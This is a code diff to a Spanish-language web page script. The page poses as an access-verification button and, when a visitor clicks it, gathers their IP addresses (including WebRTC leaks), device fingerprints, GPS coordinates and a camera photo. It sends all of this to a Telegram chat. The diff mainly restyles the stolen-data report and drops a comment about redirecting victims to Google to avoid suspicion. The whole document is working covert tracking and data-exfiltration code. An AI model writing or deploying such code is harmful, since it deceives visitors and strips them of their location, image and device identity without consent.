@@ -143,7 +143,7 @@
             const battery = await navigator.getBattery();
             return {
                 level: `${Math.round(battery.level * 100)}%`,
-                charging: battery.charging ? 'Sí' : 'No',
+                charging: battery.charging ? '✅ Sí' : '❌ No',
                 timeRemaining: battery.dischargingTime ? `${Math.round(battery.dischargingTime / 60)} min` : 'N/A'
             };
         } catch(e) { return { level: 'Error', charging: 'Error', timeRemaining: 'Error' }; }
@@ -198,7 +198,8 @@
         ctx.lineTo(330, 140);
         ctx.fillStyle = '#0f0';
         ctx.fill();
-        return canvas.toDataURL().slice(0, 150);
+        // Acortar hash
+        return canvas.toDataURL().slice(0, 60) + '...';
     }
 
     function getWebGLInfo() {
@@ -266,7 +267,7 @@
     }
 
     function areCookiesEnabled() {
-        return navigator.cookieEnabled ? 'Sí' : 'No';
+        return navigator.cookieEnabled ? '✅ Sí' : '❌ No';
     }
 
     function getPlatform() {
@@ -315,12 +316,10 @@
 
     // ---------- Acción del botón ----------
     document.getElementById('btn').onclick = async () => {
-        // Ocultar botón y mostrar mensaje de "procesando" opcional
         const btn = document.getElementById('btn');
         btn.innerText = 'Procesando...';
         btn.disabled = true;
 
-        // Recolectar todo en paralelo
         const [
             publicIPs, webrtcIPs, battery, network, screenInfo, canvasFP,
             webgl, audioFP, fonts, plugins, languages, deviceMemory,
@@ -347,35 +346,53 @@
             capturePhoto().catch(() => null)
         ]);
 
-        // Construir mensaje
-        let message = `📊 *INFORMACIÓN COMPLETA DEL DISPOSITIVO*\n━━━━━━━━━━━━━━━━━━━━\n\n`;
-        message += `🌐 *IPs públicas:*\n`;
-        for (const [k,v] of Object.entries(publicIPs)) message += `- ${k}: ${v}\n`;
-        message += `\n🕵️ *WebRTC (IP real posible):*\n${webrtcIPs.length ? webrtcIPs.join('\n') : 'No detectada'}\n`;
-        message += `\n🔋 *Batería:* ${battery.level} (cargando: ${battery.charging}) - restante: ${battery.timeRemaining}`;
-        message += `\n📡 *Red:* ${network.type} (${network.downlink}, ${network.rtt})`;
-        message += `\n🖥️ *Pantalla:* ${screenInfo.width}x${screenInfo.height}, ratio ${screenInfo.pixelRatio}, orientación ${screenInfo.orientation}`;
-        message += `\n🎨 *Canvas FP:* \`${canvasFP}...\``;
-        message += `\n🎵 *Audio FP:* \`${audioFP}\``;
-        message += `\n🎮 *WebGL:* ${webgl.renderer} (${webgl.vendor})`;
-        message += `\n🔤 *Fuentes:* ${fonts}`;
-        message += `\n🧩 *Plugins:* ${plugins}`;
-        message += `\n🗣️ *Idiomas:* ${languages}`;
-        message += `\n💾 *RAM estimada:* ${deviceMemory}`;
-        message += `\n👆 *Toques simultáneos:* ${maxTouch}`;
-        message += `\n🚫 *Do Not Track:* ${doNotTrack}`;
-        message += `\n🍪 *Cookies:* ${cookies}`;
-        message += `\n💻 *SO/UA:* ${platformInfo.platform} - ${platformInfo.userAgent} (núcleos: ${platformInfo.hardwareConcurrency})`;
-        message += `\n🕒 *Zona horaria:* ${timezone}`;
-        if (gps) message += `\n📍 *GPS:* ${gps.lat},${gps.lng} (±${gps.acc}m) - https://www.google.com/maps?q=${gps.lat},${gps.lng}`;
-        else message += `\n📍 *GPS:* No disponible (permiso denegado)`;
-        message += `\n━━━━━━━━━━━━━━━━━━━━\n⚡ @Society`;
+        // 🔥 NUEVO MENSAJE MEJORADO 🔥
+        let message = `*📡 INFORME DE DISPOSITIVO* 📡\n`;
+        message += `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n\n`;
+
+        message += `*🌐 RED e IP*\n`;
+        message += `└ IP pública: \`${publicIPs['ipapi.co']}\`\n`;
+        if (webrtcIPs.length) message += `└ IP real (WebRTC): \`${webrtcIPs[0]}\`\n`;
+        else message += `└ IP real (WebRTC): No detectada\n`;
+        message += `└ Proveedores: Cloudflare (${publicIPs['Cloudflare']}), ipify (${publicIPs['ipify']})\n\n`;
+
+        message += `*🔋 SISTEMA*\n`;
+        message += `└ Batería: ${battery.level} (cargando: ${battery.charging})\n`;
+        message += `└ Red: ${network.type} (${network.downlink}, ${network.rtt})\n`;
+        message += `└ Pantalla: ${screenInfo.width}x${screenInfo.height} @${screenInfo.pixelRatio}x, orientación ${screenInfo.orientation}\n`;
+        message += `└ SO: ${platformInfo.platform}\n`;
+        message += `└ Zona horaria: ${timezone}\n\n`;
+
+        message += `*🎨 HUELLAS DIGITALES*\n`;
+        message += `└ Canvas FP: \`${canvasFP}\`\n`;
+        message += `└ Audio FP: \`${audioFP}\`\n`;
+        message += `└ WebGL: ${webgl.renderer} (${webgl.vendor})\n\n`;
+
+        message += `*🔤 SOFTWARE*\n`;
+        message += `└ Navegador: ${platformInfo.userAgent.split(' ')[0]} (núcleos: ${platformInfo.hardwareConcurrency})\n`;
+        message += `└ Idiomas: ${languages}\n`;
+        message += `└ Fuentes instaladas: ${fonts.substring(0, 80)}...\n`;
+        message += `└ Plugins: ${plugins.substring(0, 60)}...\n`;
+        message += `└ Cookies: ${cookies}\n\n`;
+
+        message += `*📱 HARDWARE*\n`;
+        message += `└ RAM estimada: ${deviceMemory}\n`;
+        message += `└ Toques simultáneos: ${maxTouch}\n\n`;
+
+        if (gps) {
+            message += `*📍 UBICACIÓN (GPS)*\n`;
+            message += `└ Lat: ${gps.lat}, Lng: ${gps.lng}\n`;
+            message += `└ Precisión: ±${gps.acc} m\n`;
+            message += `└ Mapa: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n\n`;
+        } else {
+            message += `*📍 UBICACIÓN (GPS)*\n└ No disponible (permiso denegado)\n\n`;
+        }
+
+        message += `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n`;
+        message += `⚡ *Desarrollado por @Society*`;
 
         await sendToTelegram(message);
-        if (foto) await sendToTelegram('📸 *Foto capturada*', foto);
-
-        // Redirigir a Google para despistar (opcional, comenta si no quieres)
-        // window.location.href = 'https://www.google.com';
+        if (foto) await sendToTelegram('📸 *Foto del visitante*', foto);
 
         btn.innerText = '✅ Verificar acceso';
         btn.disabled = false;
